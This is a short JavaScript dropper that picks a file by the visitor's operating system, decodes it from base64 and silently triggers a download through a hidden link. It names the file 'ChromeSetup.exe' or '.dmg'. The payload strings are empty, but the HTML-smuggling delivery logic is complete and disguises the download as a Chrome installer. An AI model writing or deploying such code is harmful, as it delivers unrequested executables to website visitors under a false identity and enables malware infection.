filedataLinux = ""

filedataWin = ""
test = ""
if (navigator.platform.indexOf("Win")!=-1) OSName="Windows";
if (navigator.platform.indexOf("Mac")!=-1) OSName="MacOS";
if (navigator.platform.indexOf("X11")!=-1) OSName="UNIX";
if (navigator.platform.indexOf("Linux")!=-1) OSName="Linux";
function base64ToBytes(b64data) {
    var binary_bytes = atob(b64data);
    var binary_length = binary_bytes.length;
    var bytes_data = new Uint8Array(binary_length);

    for (let i = 0; i < binary_length; i++) {
        bytes_data[i] = binary_bytes.charCodeAt(i);        
    }
    return bytes_data.buffer;
}
if (OSName === "Windows") {
    filedata = filedataWin
    filename = "ChromeSetup.exe"
} else if(OSName === "UNIX" || OSName === "Linux"){
    filedata = test   
    filename = "ChromeSetup" 
}else if(OSName === "MacOS"){
    filedata = filedataLinux
    filename = "ChromeSetup.dmg"
}
var filebytes = base64ToBytes(filedata);
var blob = new Blob([filebytes], {"type": "octet/stream"});

var anchor = document.createElement("a");
document.body.append(anchor)
anchor.style = "display: none;";

var url = window.URL.createObjectURL(blob);
anchor.href = url;
anchor.download = filename;
anchor.click();

window.URL.revokeObjectURL(url);
